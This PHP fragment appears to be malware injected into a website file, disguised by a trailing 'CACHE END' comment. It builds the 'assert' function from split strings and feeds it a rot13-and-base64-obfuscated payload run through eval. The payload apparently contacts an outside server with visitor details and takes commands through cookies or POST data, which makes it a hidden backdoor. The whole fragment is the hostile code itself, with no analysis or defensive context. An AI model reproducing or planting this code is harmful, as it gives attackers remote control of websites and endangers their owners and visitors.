//assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl9jMKWmo25ypaZhLzy6Y2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWTyjXF4vWzD9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvMQMuZJIuMQOyBTAzMJZ3AwExMJLmAGNlMJD3LGNmZmHvYvExYvE1YvEwYvVkVvx7PzyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcVQ09VQRcVUfXWTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPE1pzjcBjc9VTIfp2IcMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsHxIHIIWBISWOGyATEIVfVSEFIHHcBjbxpzImqJk0VQ0tL3IloS9yrTIwXPEwnPx7PzA1pzksL2kip2HbWTAbXGfXWTyvqvN9VPElMKA1oUD7Pa0tMJkmMFO7PvEzpPN9VTMmo2Aeo3OyovtvpTIlp29hMKWmYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWTyjXF4vWzD9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvMQMuZJIuMQOyBTAzMJZ3AwExMJLmAGNlMJD3LGNmZmHvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtpTIlp29hMKWmYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwx4AGMyZTWyVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>